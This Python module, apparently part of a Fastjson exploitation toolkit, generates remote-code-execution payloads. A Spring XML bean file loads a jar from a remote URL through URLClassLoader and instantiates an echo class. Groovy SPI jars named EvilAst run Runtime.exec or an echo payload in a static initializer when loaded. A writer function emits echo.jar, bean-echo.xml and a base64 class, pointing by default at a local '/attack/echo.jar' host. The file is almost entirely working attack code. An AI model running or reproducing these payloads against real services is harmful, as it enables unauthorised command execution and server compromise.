"""回显相关攻击资源：Spring XML 远程加载 / Groovy SPI jar。"""

from __future__ import annotations

import io
import os
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Optional
from xml.sax.saxutils import escape

from fastjson_toolkit.poc.echo.compile import (
    EchoArtifact,
    build_echo_artifact,
    compile_java_source,
)
from fastjson_toolkit.poc.echo.source import DEFAULT_CMD_HEADER


def _cp_join(*parts: str) -> str:
    return os.pathsep.join(p for p in parts if p)


def build_spring_echo_xml(
    *,
    jar_url: str,
    class_name: str = "EchoPayload",
) -> bytes:
    """Spring XML：URLClassLoader 加载远程 jar 并 newInstance 回显类。"""
    url = escape(jar_url.strip())
    cn = escape(class_name.strip() or "EchoPayload")
    xml = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <!-- 授权测试：远程加载回显类并实例化 -->
    <bean id="cl" class="java.net.URLClassLoader">
        <constructor-arg>
            <list>
                <value>{url}</value>
            </list>
        </constructor-arg>
        <constructor-arg>
            <bean class="org.springframework.util.ClassUtils" factory-method="getDefaultClassLoader"/>
        </constructor-arg>
    </bean>
    <bean id="echoClz" class="java.lang.Class" factory-bean="cl" factory-method="loadClass">
        <constructor-arg value="{cn}"/>
    </bean>
    <bean class="java.lang.Object" factory-bean="echoClz" factory-method="newInstance"/>
</beans>
"""
    return xml.encode("utf-8")


_GROOVY_STUBS: dict[str, str] = {
    "org/codehaus/groovy/ast/ASTNode.java": """\
package org.codehaus.groovy.ast;
public class ASTNode {}
""",
    "org/codehaus/groovy/control/SourceUnit.java": """\
package org.codehaus.groovy.control;
public class SourceUnit {}
""",
    "org/codehaus/groovy/control/CompilePhase.java": """\
package org.codehaus.groovy.control;
public enum CompilePhase { CONVERSION }
""",
    "org/codehaus/groovy/transform/ASTTransformation.java": """\
package org.codehaus.groovy.transform;
import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.SourceUnit;
public interface ASTTransformation {
    void visit(ASTNode[] nodes, SourceUnit source);
}
""",
    "org/codehaus/groovy/transform/GroovyASTTransformation.java": """\
package org.codehaus.groovy.transform;
import org.codehaus.groovy.control.CompilePhase;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
@Retention(RetentionPolicy.RUNTIME)
public @interface GroovyASTTransformation {
    CompilePhase phase();
}
""",
}


def _compile_groovy_stubs(stub_dir: Path) -> str:
    src_root = stub_dir / "src"
    out_root = stub_dir / "classes"
    out_root.mkdir(parents=True, exist_ok=True)
    paths: list[str] = []
    for rel, text in _GROOVY_STUBS.items():
        p = src_root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
        paths.append(str(p))
    javac = shutil.which("javac")
    if not javac:
        raise RuntimeError("未找到 javac")
    cmd = [
        javac,
        "-encoding",
        "UTF-8",
        "-source",
        "8",
        "-target",
        "8",
        "-d",
        str(out_root),
        *paths,
    ]
    proc = subprocess.run(cmd, capture_output=True)
    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout or b"").decode("utf-8", errors="replace")
        raise RuntimeError(f"groovy stub javac failed:\n{err}")
    return str(out_root)


def build_groovy_echo_jar(
    *,
    engine: str = "auto",
    cmd_header: str = DEFAULT_CMD_HEADER,
    default_cmd: str = "id",
) -> tuple[bytes, EchoArtifact]:
    """生成 Groovy ASTTransformation SPI jar（静态块触发回显）。"""
    echo = build_echo_artifact(
        engine=engine,
        cmd_header=cmd_header,
        default_cmd=default_cmd,
        class_name="EchoPayload",
        package="fj1280",
        banner="FJ1280-GROOVY-ECHO",
        trigger_static=True,
    )

    evil_src = """\
package fj1280;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class EvilAst implements ASTTransformation {
    static {
        try {
            new EchoPayload();
        } catch (Throwable ignore) {
        }
    }

    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) {
    }
}
"""
    with tempfile.TemporaryDirectory(prefix="fj-groovy-echo-") as td:
        root = Path(td)
        stub_cp = _compile_groovy_stubs(root / "stubs")
        echo_classes = root / "echo_classes"
        echo_classes.mkdir(parents=True, exist_ok=True)
        (echo_classes / "fj1280").mkdir(parents=True, exist_ok=True)
        (echo_classes / "fj1280" / "EchoPayload.class").write_bytes(echo.class_bytes)

        evil_bytes = compile_java_source(
            evil_src,
            "EvilAst",
            classpath=_cp_join(stub_cp, str(echo_classes)),
            out_dir=root / "evil_out",
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("fj1280/EchoPayload.class", echo.class_bytes)
            zf.writestr("fj1280/EvilAst.class", evil_bytes)
            zf.writestr(
                "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
                "fj1280.EvilAst\n",
            )
        return buf.getvalue(), echo


def build_groovy_exec_jar(*, cmd: str = "id") -> bytes:
    """生成 Groovy SPI jar：静态块 Runtime.exec(cmd)（非回显，OS 自适应）。"""
    from fastjson_toolkit.poc.echo.source import java_os_adaptive_exec, java_string_literal

    cmd_lit = java_string_literal(cmd or "id")
    exec_block = java_os_adaptive_exec(f'"{cmd_lit}"', indent="            ")
    evil_src = f"""\
package fj1280;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class EvilAst implements ASTTransformation {{
    static {{
        try {{
{exec_block}
        }} catch (Throwable ignore) {{
        }}
    }}

    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) {{
    }}
}}
"""
    with tempfile.TemporaryDirectory(prefix="fj-groovy-exec-") as td:
        root = Path(td)
        stub_cp = _compile_groovy_stubs(root / "stubs")
        evil_bytes = compile_java_source(
            evil_src,
            "EvilAst",
            classpath=stub_cp,
            out_dir=root / "evil_out",
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("fj1280/EvilAst.class", evil_bytes)
            zf.writestr(
                "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
                "fj1280.EvilAst\n",
            )
        return buf.getvalue()


def write_echo_attack_files(
    out_dir: Path,
    *,
    engine: str = "auto",
    cmd_header: str = DEFAULT_CMD_HEADER,
    jar_url: Optional[str] = None,
) -> dict[str, Path]:
    """写出 echo.jar / bean-echo.xml（供 Spring XML 链引用）。"""
    out_dir.mkdir(parents=True, exist_ok=True)
    art = build_echo_artifact(engine=engine, cmd_header=cmd_header, banner="FJ-ECHO")
    jar_path = out_dir / "echo.jar"
    jar_path.write_bytes(art.as_jar())
    url = jar_url or "http://127.0.0.1:18080/attack/echo.jar"
    xml_path = out_dir / "bean-echo.xml"
    xml_path.write_bytes(build_spring_echo_xml(jar_url=url, class_name=art.class_name))
    b64_path = out_dir / "echo.b64"
    b64_path.write_text(art.class_b64, encoding="ascii")
    return {"jar": jar_path, "xml": xml_path, "class_b64": b64_path}
